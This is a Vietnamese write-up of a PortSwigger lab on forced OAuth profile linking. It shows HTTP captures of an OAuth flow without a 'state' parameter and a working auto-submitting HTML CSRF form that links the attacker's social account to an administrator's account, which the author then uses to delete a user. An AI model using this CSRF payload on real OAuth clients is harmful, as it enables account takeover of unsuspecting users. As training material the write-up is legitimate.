# [Lab: Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)

Tóm tắt: Lỗ hổng xuất hiện ở chỗ client application sử dụng OAuth 2.0 nhưng không dùng `state` parameter nên có thể bị tấn công csrf.

Pentest

Quá trình đăng nhập bình thường:
```http
POST /login HTTP/1.1
Host: 0aac008403de70aec3344a7a00890057.web-security-academy.net
Cookie: session=jC8vNIQVWcpX76FvReSL5R5B30SJB2N4
Content-Length: 68
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0aac008403de70aec3344a7a00890057.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aac008403de70aec3344a7a00890057.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

csrf=6OXBVvaZGXp8CtDWb4v4FmN2DShIOpyF&username=wiener&password=peter
```
response:
```http
HTTP/1.1 302 Found
Location: /my-account
Set-Cookie: session=14gmFzqlokgN128C5mjC4bLVXHYedZWW; Secure; HttpOnly; SameSite=None
Connection: close
Content-Length: 0
```
=> có một cookie session

Quá trình đăng nhập dùng OAuth:
```http
GET /auth?client_id=xxludluoi5fnwu427yht1&redirect_uri=https://0aed00f204462b27c380e389008a0089.web-security-academy.net/oauth-login&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-0a4d006804b62b9fc372e48a023600d7.web-security-academy.net
Cookie: _session=B1_aA2i3ku89XzcU_seIE; _session.legacy=B1_aA2i3ku89XzcU_seIE
Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aed00f204462b27c380e389008a0089.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```
response:
```http
HTTP/1.1 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Location: https://0aed00f204462b27c380e389008a0089.web-security-academy.net/oauth-login?code=j3nAxkgXNY9F3ii7LJFgJ2N0Ei_l8xIGktlAEvw9Zzq
Content-Type: text/html; charset=utf-8
Set-Cookie: _session=B1_aA2i3ku89XzcU_seIE; path=/; expires=Thu, 22 Dec 2022 05:01:25 GMT; samesite=none; secure; httponly
Set-Cookie: _session.legacy=B1_aA2i3ku89XzcU_seIE; path=/; expires=Thu, 22 Dec 2022 05:01:25 GMT; secure; httponly
Date: Thu, 08 Dec 2022 05:01:25 GMT
Connection: close
Content-Length: 283

Redirecting to <a href="https://0aed00f204462b27c380e389008a0089.web-security-academy.net/oauth-login?code=j3nAxkgXNY9F3ii7LJFgJ2N0Ei_l8xIGktlAEvw9Zzq">https://0aed00f204462b27c380e389008a0089.web-security-academy.net/oauth-login?code=j3nAxkgXNY9F3ii7LJFgJ2N0Ei_l8xIGktlAEvw9Zzq</a>.  
```
Nhận được `code` từ server, sau đó là quá trình OAuth xảy ra ở kênh bí mật giữa 2 server `client application` và `OAuth server`. Sau đó người dùng được xác thực.

Quá trình `attach a social media account`:
```http
GET /auth?client_id=xxludluoi5fnwu427yht1&redirect_uri=https://0aed00f204462b27c380e389008a0089.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-0a4d006804b62b9fc372e48a023600d7.web-security-academy.net
Cookie: _session=B1_aA2i3ku89XzcU_seIE; _session.legacy=B1_aA2i3ku89XzcU_seIE
Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aed00f204462b27c380e389008a0089.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```
response:
```http
HTTP/1.1 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Location: https://0aed00f204462b27c380e389008a0089.web-security-academy.net/oauth-linking?code=redKVFStLYwxl2tpgEYirEv_IcDtI9tBw5mc7iWtCCM
Content-Type: text/html; charset=utf-8
Set-Cookie: _session=B1_aA2i3ku89XzcU_seIE; path=/; expires=Thu, 22 Dec 2022 05:03:57 GMT; samesite=none; secure; httponly
Set-Cookie: _session.legacy=B1_aA2i3ku89XzcU_seIE; path=/; expires=Thu, 22 Dec 2022 05:03:57 GMT; secure; httponly
Date: Thu, 08 Dec 2022 05:03:57 GMT
Connection: close
Content-Length: 287

Redirecting to <a href="https://0aed00f204462b27c380e389008a0089.web-security-academy.net/oauth-linking?code=redKVFStLYwxl2tpgEYirEv_IcDtI9tBw5mc7iWtCCM">https://0aed00f204462b27c380e389008a0089.web-security-academy.net/oauth-linking?code=redKVFStLYwxl2tpgEYirEv_IcDtI9tBw5mc7iWtCCM</a>.  
```
Client application nhận được `code` từ OAuth server. Ở bước này nếu thay đổi `code` của quá trình attach tài khoản khác thì client application sẽ bị lừa.
redirect:
```http
GET /oauth-linking?code=redKVFStLYwxl2tpgEYirEv_IcDtI9tBw5mc7iWtCCM HTTP/1.1
Host: 0aed00f204462b27c380e389008a0089.web-security-academy.net
Cookie: session=BLtpP3yt8O12TU4t7dMK2GkqlPRsEHE8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0aed00f204462b27c380e389008a0089.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```
response: 200

=> Do không có parameter state nên mình có thể tấn công csrf bằng cách lừa người dùng truy cập đến /oauth-linking chỉ cần kèm theo code của server oauth gửi về khi attach tài khoản khác.

Thử 2 lần attach liên tục thì cùng một tài khoản oauth server cho 2 code khác nhau => mỗi code chỉ dùng được 1 lần.

Exploit =>
Bước 1: Đăng nhập tài khoản của mình theo cách thông thường:
Bước 2: Bật intercept on ở burp suite, Chọn `attach a social profile` ở trang account.
Bước 3: Khi nhận được phản hồi `code` từ oauth server gửi về, lưu `code` lại và chọn drop packet để không request `code` này tới client application, để dành để tạo form csrf.
```http
HTTP/1.1 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Location: https://0aed00f204462b27c380e389008a0089.web-security-academy.net/oauth-linking?code=ncjTzUfbQesjRsovc7dtcboQX3X41sGa3lZvbk3gAsU
Content-Type: text/html; charset=utf-8
Set-Cookie: _session=B1_aA2i3ku89XzcU_seIE; path=/; expires=Thu, 22 Dec 2022 05:26:07 GMT; samesite=none; secure; httponly
Set-Cookie: _session.legacy=B1_aA2i3ku89XzcU_seIE; path=/; expires=Thu, 22 Dec 2022 05:26:07 GMT; secure; httponly
Date: Thu, 08 Dec 2022 05:26:07 GMT
Connection: close
Content-Length: 287

Redirecting to <a href="https://0aed00f204462b27c380e389008a0089.web-security-academy.net/oauth-linking?code=ncjTzUfbQesjRsovc7dtcboQX3X41sGa3lZvbk3gAsU">https://0aed00f204462b27c380e389008a0089.web-security-academy.net/oauth-linking?code=ncjTzUfbQesjRsovc7dtcboQX3X41sGa3lZvbk3gAsU</a>. 
```
Bước 4: Tạo form html để tự động chuyển hướng người dùng tới client application attach profile kèm theo code của mình.
```html
<html>
    <body>
        <form action="https://0aed00f204462b27c380e389008a0089.web-security-academy.net/oauth-linking" method="GET">
			<input type="hidden" name="code" value="ncjTzUfbQesjRsovc7dtcboQX3X41sGa3lZvbk3gAsU" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
Bước 5: Gửi form đó lên exploit server rồi chọn gửi cho mục tiêu
Bước 6: Đăng xuất ra và đăng nhập lại bằng media account của mình
Kết quả:
![ca80cb377d21d54cb79da86ddb9bdbca.png](../../../../../../_resources/ca80cb377d21d54cb79da86ddb9bdbca.png)
Bước 7: Vào admin panel xóa tài khoản carlos theo yêu cầu.

Done